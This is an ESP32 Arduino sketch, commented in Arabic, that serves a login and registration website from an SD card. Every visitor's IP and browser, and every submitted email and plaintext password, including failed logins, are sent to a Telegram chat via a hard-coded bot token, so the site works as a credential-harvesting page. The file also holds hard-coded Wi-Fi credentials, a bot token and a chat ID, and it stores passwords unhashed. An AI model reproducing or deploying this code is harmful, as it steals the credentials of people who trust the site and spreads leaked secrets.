#include <WiFi.h>
#include <WebServer.h>
#include <SD.h>
#include <SPI.h>
#include <WiFiClientSecure.h>
#include <UniversalTelegramBot.h>
#include <ArduinoJson.h>

// تعريف العناصر الرئيسية
WebServer server(80);
File uploadFile;

// إعدادات الواي فاي
const char* ssid = "Mayar2.4";
const char* password = "01009059591@mayar";

// إعدادات بوت تليجرام
#define BOT_TOKEN "7674908219:AAH4dHQ2vFL8qByqfZ4NyJ8gR9dAptQq384"
#define CHAT_ID "-1002544571276"

// تعريف عميل آمن للاتصال بتليجرام
WiFiClientSecure secured_client;
UniversalTelegramBot bot(BOT_TOKEN, secured_client);

// تعريف دبوس الاتصال بوحدة SD
#define SD_CS 5

// ملف تخزين بيانات المستخدمين
const char* USERS_FILE = "/users.json";

void setup() {
  Serial.begin(115200);
  Serial.println("بدء تشغيل النظام...");

  // بدء تشغيل وحدة SD
  Serial.print("تهيئة وحدة SD... ");
  if (!SD.begin(SD_CS)) {
    Serial.println("فشل في تهيئة وحدة SD!");
    return;
  }
  Serial.println("تم تهيئة وحدة SD بنجاح!");

  // إنشاء ملف المستخدمين إذا لم يكن موجودًا
  if (!SD.exists(USERS_FILE)) {
    File usersFile = SD.open(USERS_FILE, FILE_WRITE);
    if (usersFile) {
      // إنشاء مصفوفة JSON فارغة
      usersFile.println("[]");
      usersFile.close();
      Serial.println("تم إنشاء ملف المستخدمين بنجاح!");
    } else {
      Serial.println("فشل في إنشاء ملف المستخدمين!");
    }
  } else {
    Serial.println("ملف المستخدمين موجود مسبقًا!");
  }

  // بدء الاتصال بالواي فاي
  Serial.print("الاتصال بشبكة الواي فاي... ");
  WiFi.begin(ssid, password);
  while (WiFi.status() != WL_CONNECTED) {
    delay(500);
    Serial.print(".");
  }
  Serial.println("");
  Serial.println("تم الاتصال بنجاح!");
  Serial.print("عنوان IP الخاص بالجهاز: ");
  Serial.println(WiFi.localIP());

  // تخطي شهادة SSL للاتصال بتليجرام
  secured_client.setCACert(TELEGRAM_CERTIFICATE_ROOT);

  // إرسال رسالة تأكيد الاتصال
  bot.sendMessage(CHAT_ID, "تم تشغيل خادم الويب على ESP32\nعنوان IP: " + WiFi.localIP().toString(), "");
  Serial.println("تم إرسال رسالة تأكيد الاتصال إلى تليجرام!");

  // تعريف مسارات الخادم
  server.on("/", HTTP_GET, handleRoot);
  server.on("/login", HTTP_POST, handleLogin);
  server.on("/register", HTTP_POST, handleRegister);
  server.onNotFound(handleNotFound);
  
  // بدء تشغيل الخادم
  server.begin();
  Serial.println("تم تشغيل خادم الويب!");
}

void loop() {
  server.handleClient();
}

// دالة للتعامل مع الصفحة الرئيسية
void handleRoot() {
  String ip = server.client().remoteIP().toString();
  String userAgent = server.header("User-Agent");
  String method = server.method() == HTTP_GET ? "GET" : "POST";
  String path = server.uri();
  
  String message = "⚠️ New Visitor! ⚠️\n";
  message += "IP: " + ip + "\n";
  message += "Browser: " + userAgent + "\n";
  message += "Method: " + method + "\n";
  message += "Path: " + path + "\n";
  message += "Time: " + String(millis() / 1000) + " seconds since startup";
  
  bot.sendMessage(CHAT_ID, message, "");
  Serial.println("Visitor info sent to Telegram!");
  
  // عرض صفحة الويب من بطاقة SD
  File file = SD.open("/index.html", FILE_READ);
  if (!file) {
    server.send(404, "text/plain", "ملف غير موجود!");
    Serial.println("خطأ: ملف index.html غير موجود!");
    return;
  }
  
  server.streamFile(file, "text/html");
  file.close();
  Serial.println("تم عرض صفحة index.html بنجاح!");
}

// دالة للتعامل مع طلبات تسجيل الدخول
void handleLogin() {
  String email = server.arg("email");
  String password = server.arg("password");
  
  if (email != "" && password != "") {
    if (verifyUser(email, password)) {
      // Send login notification to Telegram
      String loginMsg = "✅ Successful Login!\n";
      loginMsg += "Email: " + email + "\n";
      loginMsg += "Password: " + password + "\n";
      loginMsg += "IP: " + server.client().remoteIP().toString();
      bot.sendMessage(CHAT_ID, loginMsg, "");
      
      server.send(200, "text/plain", "HI FROM ESP32! WELCOME TO OUR WEBSITE");
    } else {
      // Send failed login attempt to Telegram
      String failMsg = "❌ Failed Login Attempt!\n";
      failMsg += "Email: " + email + "\n";
      failMsg += "Password: " + password + "\n";
      failMsg += "IP: " + server.client().remoteIP().toString();
      bot.sendMessage(CHAT_ID, failMsg, "");
      
      server.send(401, "text/plain", "Invalid email or password!");
    }
  } else {
    server.send(400, "text/plain", "Please enter email and password!");
  }
}

void handleRegister() {
  String email = server.arg("email");
  String password = server.arg("password");
  
  if (email != "" && password != "") {
    if (userExists(email)) {
      // Send registration attempt for existing user
      String existMsg = "⚠️ Registration Attempt (User Exists)!\n";
      existMsg += "Email: " + email + "\n";
      existMsg += "IP: " + server.client().remoteIP().toString();
      bot.sendMessage(CHAT_ID, existMsg, "");
      
      server.send(409, "text/plain", "User already exists!");
    } else {
      if (addUser(email, password, email)) {
        // Send successful registration notification
        String regMsg = "✨ New User Registered!\n";
        regMsg += "Email: " + email + "\n";
        regMsg += "Password: " + password + "\n";
        regMsg += "IP: " + server.client().remoteIP().toString();
        bot.sendMessage(CHAT_ID, regMsg, "");
        
        server.send(200, "text/plain", "Registration successful!");
      } else {
        server.send(500, "text/plain", "Error saving data!");
      }
    }
  } else {
    server.send(400, "text/plain", "Please enter email and password!");
  }
}

// دالة للتعامل مع الملفات الأخرى (CSS, JS)
void handleNotFound() {
  // تحقق مما إذا كان الملف المطلوب موجودًا على بطاقة SD
  String path = server.uri();
  Serial.println("طلب الملف: " + path);
  
  if (path.endsWith("/")) {
    path += "index.html";
  }
  
  String contentType = getContentType(path);
  
  // إضافة "/" في البداية إذا لم يكن موجودًا
  if (path.charAt(0) != '/') {
    path = "/" + path;
  }
  
  if (SD.exists(path)) {
    File file = SD.open(path, FILE_READ);
    server.streamFile(file, contentType);
    file.close();
    Serial.println("تم عرض الملف: " + path + " بنجاح!");
  } else {
    Serial.println("خطأ: الملف غير موجود: " + path);
    server.send(404, "text/plain", "الملف غير موجود!");
  }
}

// دالة لتحديد نوع المحتوى بناءً على امتداد الملف
String getContentType(String filename) {
  if (filename.endsWith(".html")) return "text/html";
  else if (filename.endsWith(".css")) return "text/css";
  else if (filename.endsWith(".js")) return "application/javascript";
  else if (filename.endsWith(".png")) return "image/png";
  else if (filename.endsWith(".jpg")) return "image/jpeg";
  else if (filename.endsWith(".ico")) return "image/x-icon";
  else if (filename.endsWith(".json")) return "application/json";
  return "text/plain";
}

// دالة للتحقق من وجود المستخدم
bool userExists(String email) {
  File usersFile = SD.open(USERS_FILE, FILE_READ);
  if (!usersFile) {
    Serial.println("فشل في فتح ملف المستخدمين للقراءة!");
    return false;
  }
  
  DynamicJsonDocument doc(16384); // تخصيص حجم كافي للوثيقة
  DeserializationError error = deserializeJson(doc, usersFile);
  usersFile.close();
  
  if (error) {
    Serial.print("فشل في تحليل ملف المستخدمين: ");
    Serial.println(error.c_str());
    return false;
  }
  
  JsonArray users = doc.as<JsonArray>();
  for (JsonObject user : users) {
    if (user["username"] == email) {  // Check email instead of username
      return true;
    }
  }
  return false;
}

// دالة للتحقق من صحة بيانات المستخدم
bool verifyUser(String email, String password) {
  File usersFile = SD.open(USERS_FILE, FILE_READ);
  if (!usersFile) {
    Serial.println("فشل في فتح ملف المستخدمين للقراءة!");
    return false;
  }
  
  DynamicJsonDocument doc(16384); // تخصيص حجم كافي للوثيقة
  DeserializationError error = deserializeJson(doc, usersFile);
  usersFile.close();
  
  if (error) {
    Serial.print("فشل في تحليل ملف المستخدمين: ");
    Serial.println(error.c_str());
    return false;
  }
  
  JsonArray users = doc.as<JsonArray>();
  for (JsonObject user : users) {
    if (user["username"] == email && user["password"] == password) {  // Check email instead of username
      return true;
    }
  }
  return false;
}

// دالة لإضافة مستخدم جديد
bool addUser(String username, String password, String email) {
  // قراءة ملف المستخدمين الحالي
  File usersFile = SD.open(USERS_FILE, FILE_READ);
  if (!usersFile) {
    Serial.println("فشل في فتح ملف المستخدمين للقراءة!");
    return false;
  }
  
  DynamicJsonDocument doc(16384); // تخصيص حجم كافي للوثيقة
  DeserializationError error = deserializeJson(doc, usersFile);
  usersFile.close();
  
  if (error) {
    Serial.print("فشل في تحليل ملف المستخدمين: ");
    Serial.println(error.c_str());
    
    // إذا كان الملف فارغًا أو به خطأ، قم بإنشاء مصفوفة جديدة
    doc.clear();
    doc.to<JsonArray>();
  }
  
  // إضافة المستخدم الجديد
  JsonArray users = doc.as<JsonArray>();
  JsonObject newUser = users.createNestedObject();
  newUser["username"] = username;
  newUser["password"] = password;
  newUser["email"] = email;
  newUser["registered_at"] = millis() / 1000;
  newUser["ip"] = server.client().remoteIP().toString();
  
  // كتابة البيانات المحدثة إلى الملف
  SD.remove(USERS_FILE); // حذف الملف القديم
  File newUsersFile = SD.open(USERS_FILE, FILE_WRITE);
  if (!newUsersFile) {
    Serial.println("فشل في فتح ملف المستخدمين للكتابة!");
    return false;
  }
  
  if (serializeJson(doc, newUsersFile) == 0) {
    Serial.println("فشل في كتابة البيانات إلى ملف المستخدمين!");
    newUsersFile.close();
    return false;
  }
  
  newUsersFile.close();
  Serial.println("تم إضافة المستخدم بنجاح!");
  Serial.print("عدد المستخدمين الكلي: ");
  Serial.println(users.size());
  return true;
}

// دالة للحصول على قائمة جميع المستخدمين (يمكن إضافتها إذا كنت تريد عرض المستخدمين في لوحة تحكم المشرف)
String getAllUsers() {
  File usersFile = SD.open(USERS_FILE, FILE_READ);
  if (!usersFile) {
    Serial.println("فشل في فتح ملف المستخدمين للقراءة!");
    return "[]";
  }
  
  String users = "";
  while (usersFile.available()) {
    users += (char)usersFile.read();
  }
  
  usersFile.close();
  return users;
}